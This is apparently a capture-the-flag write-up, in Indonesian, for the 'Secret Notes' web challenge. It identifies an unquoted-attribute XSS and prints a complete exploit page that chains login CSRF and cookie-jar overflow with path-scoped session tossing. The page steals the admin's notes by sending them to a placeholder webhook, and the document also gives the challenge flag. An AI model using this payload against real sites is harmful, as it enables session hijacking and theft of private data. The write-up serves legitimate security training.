# Secret Notes - XSS & CSRF Exploit

## Tujuan
Eksploitasi untuk memperoleh **secret notes** dari admin bot dengan memanfaatkan **XSS** dan **CSRF**.

### Source Code
#### Setup dan Koneksi MongoDB
```python
@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        # Code for registration
        users.insert_one({
            "username": request.form["username"],
            "password": hashpass,
            "name": request.form["name"][:31]  # <== 1
        })
        session["username"] = request.form["username"]
        return redirect(url_for("profile"))
    else:
        flash("Username already exists! Try logging in.")
        return redirect(url_for("register"))

    return render_template("register.html")
```

#### Login
```python
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        users = mongo.db.users
        login_user = users.find_one({"username": request.form["username"]})

        if login_user:
            if bcrypt.checkpw(request.form["password"].encode("utf-8"), login_user["password"]):
                session["username"] = request.form["username"]
                return redirect(url_for("profile"))  # <== 2

        flash("Invalid username/password combination")
        return redirect(url_for("login"))

    return render_template("login.html")
```

---

## Injection Points Analysis

Perhatikan pada `profile.html`:
```html
<h1>Welcome, {{ username }}!</h1>
<img class="profile" alt={{ name }} src={{ url_for('static', filename='images/user.jpeg') }}></img>
```

Jika kita memasukkan `name` sebagai `\ src/onerror=alert(1)` (22 karakter), maka kita bisa memicu **XSS** karena perbedaan antara `alt="{{ name }}"` dan `alt={{ name }}`.

---

## Admin Bot Code

Admin bot akan mengunjungi halaman yang diberikan:
```javascript
const page = await browser.newPage();
await page.goto(urlToVisit, { waitUntil: 'networkidle2' });
await page.goto(`${CONFIG.APPURL}/login`, { waitUntil: 'networkidle2' });
await page.focus('input[name=username]');
await page.keyboard.type(CONFIG.ADMIN_USERNAME);
await page.focus('input[name=password]');
await page.keyboard.type(CONFIG.ADMIN_PASS);
await page.click('input[type="submit"]');
await sleep(1000);
await page.close();
```

---

### Rencana Eksploitasi

1. **Login dengan CSRF**: Buat halaman dengan hidden form untuk mengirim login request.
2. **XSS untuk Cookie Jar Overflow**: Menimpa session cookie dengan path `/profile`.
3. **Eksploitasi Profile Page Admin**: Ketika admin mengunjungi `/profile`, browser akan mengirim cookie dengan path precedence, sehingga memicu payload XSS yang mengambil notes.

---

### Final Payload
Buat halaman HTML berikut dan host di **GitHub Pages** atau **Cloudflare**.

```html
<html>
<body>
  <form action="https://secret-notes.1nf1n1ty.team/login" method="POST">
    <input type="hidden" name="username" value="<ATTACKER1_USERNAME>" />
    <input type="hidden" name="password" value="<ATTACKER1_PASSWORD>" />
    <input type="submit" value="Submit request" />
  </form>
  <script>
    let url = "<WEBHOOKURL>";
    let cookie = "<ATTACKER2_COOKIE>";
    let part2 = 'let data = window.open("/notes");setInterval( function (){ data? window.location = `' + url + '?flag=${btoa(data.document.body.innerHTML)}`:console.log(data)}, 100)';
    window.name = "for (let i = 0; i < 700; i++) {document.cookie = `cookie${i}=${i}; Secure`;} for (let i = 0; i < 700; i++) {document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`;};document.cookie=`session="+cookie+"; path=/profile`;window.name='eval(atob(`" + btoa(part2) + "`))'";
    history.pushState('', '', '/');
    document.forms[0].submit();
  </script>
</body>
</html>
```

---

### Flag
Setelah admin mengunjungi halaman ini, flag akan dikirim ke `WEBHOOK`.

---

Flag: `ironCTF{CSRF_SELFX55_C00ki3_t05s1ng_co0kie_p4th_fL4g}`